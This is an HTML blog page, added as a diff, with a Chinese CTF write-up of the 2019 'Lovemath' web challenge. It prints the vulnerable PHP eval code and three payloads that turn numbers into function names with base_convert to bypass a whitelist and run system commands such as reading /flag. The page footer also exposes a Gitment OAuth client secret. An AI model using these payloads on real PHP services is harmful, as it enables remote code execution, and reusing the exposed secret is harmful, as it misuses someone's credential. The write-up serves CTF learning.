@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            2019国赛Web线上题目Lovemath多解WP
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/"> 
+                    2019国赛Web线上题目Lovemath多解WP 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-04-23   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#2019国赛Web线上题目Lovemath多解WP"><span class="toc-list-text">2019国赛Web线上题目Lovemath多解WP</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#题目代码"><span class="toc-list-text">题目代码</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#解题思路"><span class="toc-list-text">解题思路</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#POC-1"><span class="toc-list-text">POC-1</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#POC-2"><span class="toc-list-text">POC-2</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#POC-3"><span class="toc-list-text">POC-3</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p>
+<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span><br><span class="line">if(!isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    $content = $_GET[&apos;c&apos;]; </span><br><span class="line">    if (strlen($content) &gt;= 80) &#123; </span><br><span class="line">        die(&quot;太长了不会算&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; </span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span><br><span class="line">    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123; </span><br><span class="line">        if (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //帮你算出答案 </span><br><span class="line">    eval(&apos;echo &apos;.$content.&apos;;&apos;); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p>
+<p>也就是说只允许Eval使用白名单的函数做字符串</p>
+<p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p>
+<p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p>
+<p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p>
+<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$input = hexdec(bin2hex(&quot;system(&apos;cat /flag&apos;);&quot;))</span><br><span class="line">$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</span><br></pre></td></tr></table></figure>
+
+<p>完整转换是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</span><br></pre></td></tr></table></figure>
+
+<p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
+<p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p>
+<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))()&#123;9&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>解码出来是<code>system(getallheaders(){9})</code></p>
+<p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p>
+<h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
+<p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/04/08/西湖论剑2019-Writeup/"> 西湖论剑2019-Writeup </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Tue Apr 23 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
